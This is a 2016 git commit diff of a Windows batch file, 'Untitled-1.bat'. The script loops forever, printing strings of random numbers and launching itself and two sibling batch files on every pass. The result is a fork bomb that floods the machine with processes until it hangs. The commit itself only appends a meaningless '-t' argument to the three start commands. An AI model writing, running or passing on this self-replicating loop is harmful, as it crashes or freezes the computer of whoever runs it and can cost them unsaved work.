ba677394d06a50a496a54c1c3fb2f249689890db
Dawnkeh <lilsk8rdude00@gmail.com>
2016-10-18 16:02:09 -0300

    Update Untitled-1.bat

--- Untitled-1.bat
+++ Untitled-1.bat
@@ -3,7 +3,7 @@ color 0c
 
 :1
 echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
-start C:\CK\Untitled-1.bat
-start C:\CK\Untitled-2.bat
-start C:\CK\Untitled-3.bat
+start C:\CK\Untitled-1.bat  -t
+start C:\CK\Untitled-2.bat  -t
+start C:\CK\Untitled-3.bat  -t
 goto 1
